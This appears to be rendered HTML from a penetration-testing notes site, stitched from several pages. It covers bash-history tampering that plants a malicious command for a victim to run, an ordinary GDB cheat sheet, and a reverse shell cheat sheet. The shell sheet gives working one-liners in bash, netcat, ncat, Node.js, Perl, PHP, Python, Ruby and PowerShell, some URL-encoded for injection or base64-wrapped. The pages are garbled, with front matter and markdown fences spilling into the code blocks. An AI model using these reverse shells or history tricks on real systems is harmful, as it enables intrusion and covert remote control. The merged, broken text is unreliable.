+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>unlink<span class="w"> </span>~/.bash_history<span class="w"> </span><span class="p">;</span><span class="w"> </span>touch<span class="w"> </span>~/.bash_history
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;HISTFILE=~/.bash_history&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="c1"># If victim uses zsh...</span>
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>unlink<span class="w"> </span>~/.zsh_history<span class="w"> </span><span class="p">;</span><span class="w"> </span>touch<span class="w"> </span>~/.zsh_history
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;HISTFILE=~/.zsh_history&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.zshrc
+</span></code></pre></div>
+<p>After rebooting the machine, the bash history will be stored in <strong><code>.bash_history</code></strong> file and attackers can see the history when logged in again. It may extract sensitive information.</p>
+<p><br /></p>
+<h2 id="false-information-inserting">False Information Inserting</h2>
+<p>Attackers can easily insert arbitrary content into <strong><code>.bash_history</code></strong> as follow. </p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># Assume `malicious` is exactly malicious binary.</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;~/malicious&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bash_history
+</span></code></pre></div>
+<h2 id="when-victim-see-the-content-of-the-bash_history-malicious-command-may-be-executed-by-the-victims-misunderstanding">When victim see the content of the <strong><code>bash_history</code></strong>, malicious command may be executed by the victim’s misunderstanding.</h2>
+<p>title: GDB Cheat Sheet
+description: GDB (GNU Debugger) is a portable debugger used for reverse engineering.
+tags:
+    - Reverse Engineering
+refs:
+date: 2024-02-18
+draft: false</p>
+<hr />
+<h2 id="using-enhanced-gdb">Using Enhanced GDB</h2>
+<p>It's recommended to use enhanced version of GDB such as <a href="https://github.com/hugsy/gef">GEF</a>. These have some extended features.</p>
+<p><br /></p>
+<h2 id="start-debugger">Start Debugger</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>chmod<span class="w"> </span>+x<span class="w"> </span>./example
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>gdb<span class="w"> </span>./example
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="commands-in-gdb">Commands in GDB</h2>
+<h3 id="debug">Debug</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1"># Start the program</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>run
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>r
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="c1"># Continue until the next breakpoint or the end</span>
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="k">continue</span>
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>c
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="c1"># Execute the next line of code but do not enter any function calls on that line.</span>
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>next
+</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>n
+</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>
+</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a><span class="c1"># Execute the next line of code</span>
+</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a>step
+</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a>s
+</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a>
+</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a><span class="c1"># Jump to specific address</span>
+</span><span id="__span-21-18"><a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a>j<span class="w"> </span>*0x01234
+</span></code></pre></div>
+<h3 id="disassemble">Disassemble</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c1"># Disassemble the main function</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>disass<span class="w"> </span>main
+</span></code></pre></div>
+<h3 id="breakpoints">Breakpoints</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1"># Set a breakpoint at a specified line number, function, or address.</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="nb">break</span><span class="w"> </span>main
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>b<span class="w"> </span>main
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="nb">break</span><span class="w"> </span>*0x12345678
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="c1"># Add a breakpoint to the relative address position from the main function.</span>
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>b<span class="w"> </span>*main+25
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="c1"># Information about breakpoints</span>
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>info<span class="w"> </span>breakpoints
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>i<span class="w"> </span>breakpoints
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>i<span class="w"> </span>b
+</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>
+</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a><span class="c1"># Delete all breakpoints</span>
+</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>delete<span class="w"> </span>breakpoints
+</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>d<span class="w"> </span>breakpoints
+</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a><span class="c1"># Delete the specified breakpoint</span>
+</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a>delete<span class="w"> </span>&lt;breakpoint_number&gt;
+</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a>delete<span class="w"> </span><span class="m">1</span>
+</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a>d<span class="w"> </span><span class="m">1</span>
+</span></code></pre></div>
+<h3 id="view-values">View Values</h3>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c1"># Print value of expression at specific address</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>p<span class="w"> </span>0x01234
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="c1"># Examine the memory as specific address as addresses</span>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>x/a<span class="w"> </span>0x01234
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="c1"># Examine the memory at specific address as 10 characters</span>
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>x/10c<span class="w"> </span>0x01234
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="c1"># Examine the memory as specific address as string</span>
+</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>x/s<span class="w"> </span>0x01234
+</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="c1"># Examine</span>
+</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>x/g<span class="w"> </span>0x01234
+</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>
+</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a><span class="c1"># Display information of registers</span>
+</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>info<span class="w"> </span>registers
+</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a>i<span class="w"> </span>r
+</span><span id="__span-24-16"><a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a><span class="c1"># Display information of the stack frame</span>
+</span><span id="__span-24-17"><a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a>i<span class="w"> </span>f
+</span></code></pre></div>
+<h3 id="change-values">Change Values</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1"># Set N characters to specific address</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="nb">set</span><span class="w"> </span><span class="o">{</span>char<span class="w"> </span><span class="o">[</span><span class="m">5</span><span class="o">]}</span><span class="w"> </span><span class="nv">0x01234</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Hello&quot;</span>
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="c1"># Set the value stored at memory address `0x01234` to `0x5678`</span>
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="nb">set</span><span class="w"> </span>*0x01234<span class="w"> </span><span class="o">=</span><span class="w"> </span>0x5678
+</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="sb">```</span>---
+</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>title:<span class="w"> </span>Reverse<span class="w"> </span>Shell<span class="w"> </span>Cheat<span class="w"> </span>Sheet
+</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>description:<span class="w"> </span>
+</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>tags:
+</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a><span class="w">    </span>-<span class="w"> </span>Privilege<span class="w"> </span>Escalation
+</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a><span class="w">    </span>-<span class="w"> </span>Reverse<span class="w"> </span>Shell
+</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a><span class="w">    </span>-<span class="w"> </span>Windows
+</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a>refs:
+</span><span id="__span-25-14"><a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a><span class="w">    </span>-<span class="w"> </span>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+</span><span id="__span-25-15"><a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a><span class="w">    </span>-<span class="w"> </span>https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+</span><span id="__span-25-16"><a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a>date:<span class="w"> </span><span class="m">2024</span>-04-01
+</span><span id="__span-25-17"><a id="__codelineno-25-17" name="__codelineno-25-17" href="#__codelineno-25-17"></a>draft:<span class="w"> </span><span class="nb">false</span>
+</span><span id="__span-25-18"><a id="__codelineno-25-18" name="__codelineno-25-18" href="#__codelineno-25-18"></a>---
+</span><span id="__span-25-19"><a id="__codelineno-25-19" name="__codelineno-25-19" href="#__codelineno-25-19"></a>
+</span><span id="__span-25-20"><a id="__codelineno-25-20" name="__codelineno-25-20" href="#__codelineno-25-20"></a><span class="c1">## Setup Listener</span>
+</span><span id="__span-25-21"><a id="__codelineno-25-21" name="__codelineno-25-21" href="#__codelineno-25-21"></a>
+</span><span id="__span-25-22"><a id="__codelineno-25-22" name="__codelineno-25-22" href="#__codelineno-25-22"></a>First<span class="w"> </span>of<span class="w"> </span>all,<span class="w"> </span>we<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>start<span class="w"> </span>a<span class="w"> </span>listener<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nb">local</span><span class="w"> </span>machine<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>an<span class="w"> </span>incoming<span class="w"> </span>connection.
+</span><span id="__span-25-23"><a id="__codelineno-25-23" name="__codelineno-25-23" href="#__codelineno-25-23"></a>
+</span><span id="__span-25-24"><a id="__codelineno-25-24" name="__codelineno-25-24" href="#__codelineno-25-24"></a><span class="sb">```</span>sh
+</span><span id="__span-25-25"><a id="__codelineno-25-25" name="__codelineno-25-25" href="#__codelineno-25-25"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</span><span id="__span-25-26"><a id="__codelineno-25-26" name="__codelineno-25-26" href="#__codelineno-25-26"></a>
+</span><span id="__span-25-27"><a id="__codelineno-25-27" name="__codelineno-25-27" href="#__codelineno-25-27"></a><span class="c1"># For more elegant shell, use `rlwrap`.</span>
+</span><span id="__span-25-28"><a id="__codelineno-25-28" name="__codelineno-25-28" href="#__codelineno-25-28"></a><span class="c1"># https://github.com/hanslub42/rlwrap</span>
+</span><span id="__span-25-29"><a id="__codelineno-25-29" name="__codelineno-25-29" href="#__codelineno-25-29"></a>rlwrap<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="online-generator">Online Generator</h2>
+<ul>
+<li><a href="https://www.revshells.com/">Reverse Shell Generator</a></li>
+</ul>
+<p><br /></p>
+<h2 id="bash">Bash</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w">  </span>/dev/tcp/10.0.0.1/4444<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&#39;</span>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>/bin/bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&#39;</span>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="c1"># For URL param</span>
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>/?q<span class="o">=</span>bash+-i+&gt;%26+/dev/tcp/10.0.0.1/4444+0&gt;%261
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>/?q<span class="o">=</span><span class="sb">`</span>bash+-c+<span class="s1">&#39;bash+-i+&gt;%26+/dev/tcp/10.0.0.1/4444+0&gt;%261&#39;</span><span class="sb">`</span>
+</span></code></pre></div>
+<h3 id="with-base64">with Base64</h3>
+<p>Execute the following commands in target machine.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="nb">echo</span><span class="w"> </span>&lt;base64_string&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>bash
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="netcat-openbsd">Netcat OpenBSD</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>rm<span class="w"> </span>-f<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span>cat<span class="w"> </span>/tmp/f<span class="p">|</span>/bin/sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4444</span><span class="w"> </span>&gt;/tmp/f
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="ncat">Ncat</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>ncat<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>ncat<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/sh
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>ncat<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-c<span class="w"> </span>bash
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>ncat<span class="w"> </span>--udp<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>nc<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>nc<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/sh
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>nc<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-c<span class="w"> </span>bash
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a>nc<span class="w"> </span>--udp<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
+</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a>
+</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a>busybox<span class="w"> </span>nc<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>bash
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="nodejs">NodeJS</h2>
+<p>Reference: <a href="https://medium.com/dont-code-me-on-that/bunch-of-shells-nodejs-cdd6eb740f73">https://medium.com/dont-code-me-on-that/bunch-of-shells-nodejs-cdd6eb740f73</a></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>node<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;(function(){ var net = require(&quot;net&quot;), cp = require(&quot;child_process&quot;), sh = cp.spawn(&quot;/bin/sh&quot;, []); var client = new net.Socket(); client.connect(4444, &quot;10.0.0.1&quot;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();&#39;</span>
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="perl">Perl</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>perl<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="php">PHP</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$sock=fsockopen(&quot;10.0.0.1&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="python">Python</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import socket,os,pty;s=socket.socket();s.connect((&quot;10.0.0.1&quot;, 4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;bash&quot;)&#39;</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#39;</span>
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="ruby">Ruby</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>ruby<span class="w"> </span>-rsocket<span class="w"> </span>-e<span class="s1">&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span>
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="powershell">PowerShell</h2>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="n">powershell</span> <span class="n">-NoP</span> <span class="n">-NonI</span> <span class="n">-W</span> <span class="n">Hidden</span> <span class="n">-Exec</span> <span class="n">Bypass</span> <span class="n">-Command</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s2">&quot;10.0.0.1&quot;</span><span class="p">,</span><span class="n">4444</span><span class="p">);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span>  <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s2">&quot;PS &quot;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s2">&quot;&gt; &quot;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>
